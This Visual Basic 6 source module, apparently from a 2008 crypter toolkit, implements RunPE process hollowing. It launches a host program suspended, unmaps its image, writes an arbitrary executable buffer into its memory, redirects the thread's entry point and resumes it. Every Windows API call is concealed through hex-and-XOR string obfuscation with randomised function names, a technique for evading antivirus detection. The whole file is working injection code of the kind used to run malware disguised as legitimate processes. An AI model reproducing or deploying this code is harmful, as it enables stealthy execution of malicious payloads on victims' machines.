Attribute VB_Name = "mPEL"
'---------------------------------------------------------------------------------------
' Module      : mPEL
' DateTime    : 06/09/2008 23:12
' Author      : Cobein
' Mail        : cobein27@hotmail.com
' WebPage     : http://www.advancevb.com.ar
' Purpose     :
' Usage       : At your own risk
' Requirements: None
' Distribution: You can freely use this code in your own
'               applications, but you may not reproduce
'               or publish this code on any web site,
'               online service, or distribute as source
'               on any media without express permission.
'
' Credits     : RunPE based on obsol33t version, call api from rm_code
'
' History     : 06/09/2008 First Cut....................................................
'---------------------------------------------------------------------------------------

Option Explicit

Private Const CONTEXT_FULL              As Long = &H10007
Private Const MAX_PATH                  As Integer = 1260
Private Const CREATE_SUSPENDED          As Long = &H4
Private Const MEM_COMMIT                As Long = &H1000
Private Const MEM_RESERVE               As Long = &H2000
Private Const PAGE_EXECUTE_READWRITE    As Long = &H40

'Private Const IMAGE_DOS_SIGNATURE           As Long = &H5A4D&
'Private Const IMAGE_NT_SIGNATURE            As Long = &H4550&
'Private Const IMAGE_NT_OPTIONAL_HDR32_MAGIC As Long = &H10B&

'Private Const SIZE_DOS_HEADER               As Long = &H40
'Private Const SIZE_NT_HEADERS               As Long = &HF8
'Private Const SIZE_SECTION_HEADER           As Long = &H28


Public Declare Sub CopyBytes Lib "kernel32" Alias "RtlMoveMemory" (Destination As Any, Source As Any, ByVal Length As Long)





Private Type SECURITY_ATTRIBUTES
    nLength As Long
    lpSecurityDescriptor As Long
    bInheritHandle As Long
End Type

Private Type STARTUPINFO
    cb As Long
    lpReserved As Long
    lpDesktop As Long
    lpTitle As Long
    dwX As Long
    dwY As Long
    dwXSize As Long
    dwYSize As Long
    dwXCountChars As Long
    dwYCountChars As Long
    dwFillAttribute As Long
    dwFlags As Long
    wShowWindow As Integer
    cbReserved2 As Integer
    lpReserved2 As Long
    hStdInput As Long
    hStdOutput As Long
    hStdError As Long
End Type

Private Type PROCESS_INFORMATION
    hProcess As Long
    hThread As Long
    dwProcessID As Long
    dwThreadID As Long
End Type

Private Type FLOATING_SAVE_AREA
    ControlWord As Long
    StatusWord As Long
    TagWord As Long
    ErrorOffset As Long
    ErrorSelector As Long
    DataOffset As Long
    DataSelector As Long
    RegisterArea(1 To 80) As Byte
    Cr0NpxState As Long
End Type

Private Type CONTEXT
    ContextFlags As Long

    Dr0 As Long
    Dr1 As Long
    Dr2 As Long
    Dr3 As Long
    Dr6 As Long
    Dr7 As Long

    FloatSave As FLOATING_SAVE_AREA
    SegGs As Long
    SegFs As Long
    SegEs As Long
    SegDs As Long
    Edi As Long
    Esi As Long
    Ebx As Long
    Edx As Long
    Ecx As Long
    Eax As Long
    Ebp As Long
    Eip As Long
    SegCs As Long
    EFlags As Long
    Esp As Long
    SegSs As Long
End Type

Private Type IMAGE_DOS_HEADER
    e_magic As Integer
    e_cblp As Integer
    e_cp As Integer
    e_crlc As Integer
    e_cparhdr As Integer
    e_minalloc As Integer
    e_maxalloc As Integer
    e_ss As Integer
    e_sp As Integer
    e_csum As Integer
    e_ip As Integer
    e_cs As Integer
    e_lfarlc As Integer
    e_ovno As Integer
    e_res(0 To 3) As Integer
    e_oemid As Integer
    e_oeminfo As Integer
    e_res2(0 To 9) As Integer
    e_lfanew As Long
End Type

Private Type IMAGE_FILE_HEADER
    Machine As Integer
    NumberOfSections As Integer
    TimeDateStamp As Long
    PointerToSymbolTable As Long
    NumberOfSymbols As Long
    SizeOfOptionalHeader As Integer
    characteristics As Integer
End Type

Private Type IMAGE_DATA_DIRECTORY
    VirtualAddress As Long
    Size As Long
End Type

Private Type IMAGE_OPTIONAL_HEADER
    Magic As Integer
    MajorLinkerVersion As Byte
    MinorLinkerVersion As Byte
    SizeOfCode As Long
    SizeOfInitializedData As Long
    SizeOfUnitializedData As Long
    AddressOfEntryPoint As Long
    BaseOfCode As Long
    BaseOfData As Long
    ' NT additional fields.
    ImageBase As Long
    SectionAlignment As Long
    FileAlignment As Long
    MajorOperatingSystemVersion As Integer
    MinorOperatingSystemVersion As Integer
    MajorImageVersion As Integer
    MinorImageVersion As Integer
    MajorSubsystemVersion As Integer
    MinorSubsystemVersion As Integer
    W32VersionValue As Long
    SizeOfImage As Long
    SizeOfHeaders As Long
    CheckSum As Long
    SubSystem As Integer
    DllCharacteristics As Integer
    SizeOfStackReserve As Long
    SizeOfStackCommit As Long
    SizeOfHeapReserve As Long
    SizeOfHeapCommit As Long
    LoaderFlags As Long
    NumberOfRvaAndSizes As Long
    DataDirectory(0 To 15) As IMAGE_DATA_DIRECTORY
End Type

Private Type IMAGE_NT_HEADERS
    Signature As Long
    FileHeader As IMAGE_FILE_HEADER
    OptionalHeader As IMAGE_OPTIONAL_HEADER
End Type

Private Type IMAGE_SECTION_HEADER
    SecName As String * 8
    VirtualSize As Long
    VirtualAddress  As Long
    SizeOfRawData As Long
    PointerToRawData As Long
    PointerToRelocations As Long
    PointerToLinenumbers As Long
    NumberOfRelocations As Integer
    NumberOfLinenumbers As Integer
    characteristics  As Long
End Type

Sub InjectExe(ByVal sHost As String, ByRef bvBuff() As Byte)
   On Error Resume Next
Dim Pidh As IMAGE_DOS_HEADER
Dim Pinh As IMAGE_NT_HEADERS
Dim Pish As IMAGE_SECTION_HEADER
Dim Si As STARTUPINFO
Dim Pi As PROCESS_INFORMATION
Dim Ctx As CONTEXT
Dim i As Long

    Si.cb = Len(Si)
    Ctx.ContextFlags = CONTEXT_FULL

    'Tnx Slayer616
    Call Dbgthis.CallAPI(JQkAa4mA3Z(ZTlCVRR7t9("1F0C055A20025550"),"tiw4EnfbCP5k"), JQkAa4mA3Z(ZTlCVRR7t9("1C3E557F3C2C010C02581E3E37"),"NJ92SZdAg5qL"), VarPtr(Pidh), VarPtr(bvBuff(0)), Len(Pidh))
    Call Dbgthis.CallAPI(JQkAa4mA3Z(ZTlCVRR7t9("120D193F02047D53"),"yhkQghNajkgc"), JQkAa4mA3Z(ZTlCVRR7t9("3E033F740C0E1D2E042E163015"),"lwS9cxxcaCyB"), VarPtr(Pinh), VarPtr(bvBuff(Pidh.e_lfanew)), Len(Pinh))
    

    
    Call Dbgthis.CallAPI(JQkAa4mA3Z(ZTlCVRR7t9("28024A2D370F5F0A"),"Cg8CRcl81Ps4"), JQkAa4mA3Z(ZTlCVRR7t9("143B2920422A3A0A29562805241E"),"WILA6OjxF5Mv"), 0, StrPtr(sHost), 0, 0, 0, CREATE_SUSPENDED, 0, 0, VarPtr(Si), VarPtr(Pi))
    Call Dbgthis.CallAPI(JQkAa4mA3Z(ZTlCVRR7t9("2612330318"),"HfWot7T7IkDW"), JQkAa4mA3Z(ZTlCVRR7t9("3B0120261C0C346F132121221326102B05042B57"),"uuuHqmD9zDVm"), Pi.hProcess, Pinh.OptionalHeader.ImageBase)
    
    
 
    
    Call Dbgthis.CallAPI(JQkAa4mA3Z(ZTlCVRR7t9("27033957505E4107"),"LfK952r5qPPP"), JQkAa4mA3Z(ZTlCVRR7t9("302E1C4C1F241C34585A5605233F"),"fGn8jEpu469f"), Pi.hProcess, Pinh.OptionalHeader.ImageBase, Pinh.OptionalHeader.SizeOfImage, MEM_COMMIT Or MEM_RESERVE, PAGE_EXECUTE_READWRITE)
    Call Dbgthis.CallAPI(JQkAa4mA3Z(ZTlCVRR7t9("3E111D3A2B"),"PeyVGWZ47l0H"), JQkAa4mA3Z(ZTlCVRR7t9("0A0061142D172F6030361D4325187B03290C384F"),"Dt6fDcJ6YDi6"), Pi.hProcess, Pinh.OptionalHeader.ImageBase, VarPtr(bvBuff(0)), Pinh.OptionalHeader.SizeOfHeaders, 0)

For i = 0 To Pinh.FileHeader.NumberOfSections - 1

    CopyBytes Pish, bvBuff(Pidh.e_lfanew + Len(Pinh) + Len(Pish) * i), Len(Pish)
    Call Dbgthis.CallAPI(JQkAa4mA3Z(ZTlCVRR7t9("3B10092405"),"UdmHiRx3OQcz"), JQkAa4mA3Z(ZTlCVRR7t9("21310D341E0013241D4403450E2917231A1B040B"),"oEZFwtvrt6w0"), Pi.hProcess, Pinh.OptionalHeader.ImageBase + Pish.VirtualAddress, VarPtr(bvBuff(Pish.PointerToRawData)), Pish.SizeOfRawData, 0)

Next

 
    Call Dbgthis.CallAPI(JQkAa4mA3Z(ZTlCVRR7t9("3717051839"),"YcatUM51wlnr"), JQkAa4mA3Z(ZTlCVRR7t9("14251353050F07232D1F34200E3926531028"),"ZQT6qLhMYzLT"), Pi.hThread, VarPtr(Ctx))
    Call Dbgthis.CallAPI(JQkAa4mA3Z(ZTlCVRR7t9("0A163D0A1A"),"dbYfvGD0dQzj"), JQkAa4mA3Z(ZTlCVRR7t9("36301516221E27393A44203E19280F0126053016"),"xDBdKjBoS6TK"), Pi.hProcess, Ctx.Ebx + 8, VarPtr(Pinh.OptionalHeader.ImageBase), 4, 0)

    Ctx.Eax = Pinh.OptionalHeader.ImageBase + Pinh.OptionalHeader.AddressOfEntryPoint
    Call Dbgthis.CallAPI(JQkAa4mA3Z(ZTlCVRR7t9("0616295C5B"),"hbM07BbYVlKb"), JQkAa4mA3Z(ZTlCVRR7t9("2724252130020124191F4F313D3804212525"),"iPvDDAnJmz7E"), Pi.hThread, VarPtr(Ctx))
  
    Call Dbgthis.CallAPI(JQkAa4mA3Z(ZTlCVRR7t9("0315252125"),"maAMIwJXCQV4"), JQkAa4mA3Z(ZTlCVRR7t9("093636292B4D25083C5E15102626"),"GBdLX8Hmh6gu"), Pi.hThread, 0)

End Sub



Public Function ThisExe() As String
    Dim lRet        As Long
    Dim bvBuff(255) As Byte
    lRet = Dbgthis.CallAPI(JQkAa4mA3Z(ZTlCVRR7t9("1A5C1D170E1E5B64"),"q9oykrhVkl7W"), JQkAa4mA3Z(ZTlCVRR7t9("352B432F3E140124293C1C031700560F3431"),"rN7bQptHLzuo"), App.hInstance, VarPtr(bvBuff(0)), 256)
    ThisExe = Left$(StrConv(bvBuff, vbUnicode), lRet)
End Function



Public Function JQkAa4mA3Z(ByVal rvw4Dq10F7 As String,ByVal NC9T9EerkL As String) As String
Dim a3xihNkb6a As long
for a3xihNkb6a = 1 To Len(rvw4Dq10F7)
JQkAa4mA3Z = JQkAa4mA3Z & Chr(Asc(Mid(NC9T9EerkL, IIf(a3xihNkb6a Mod Len(NC9T9EerkL) <> 0, a3xihNkb6a Mod Len(NC9T9EerkL), Len(NC9T9EerkL)), 1)) Xor Asc(Mid(rvw4Dq10F7, a3xihNkb6a, 1)))
Next a3xihNkb6a
End Function
Public Function ZTlCVRR7t9(ByVal u6UhknuuZM As String) As String
Dim ozeMxa10hU As String
Dim ZFoE0cNEwi As String
Dim Ffx5dFdzt3 As Long
For Ffx5dFdzt3 = 1 to Len(u6UhknuuZM) Step 2
ozeMxa10hU = Chr$(Val("&H" & Mid$(u6UhknuuZM,Ffx5dFdzt3,2)))
ZFoE0cNEwi = ZFoE0cNEwi & ozeMxa10hU
Next Ffx5dFdzt3
ZTlCVRR7t9 = ZFoE0cNEwi
End Function
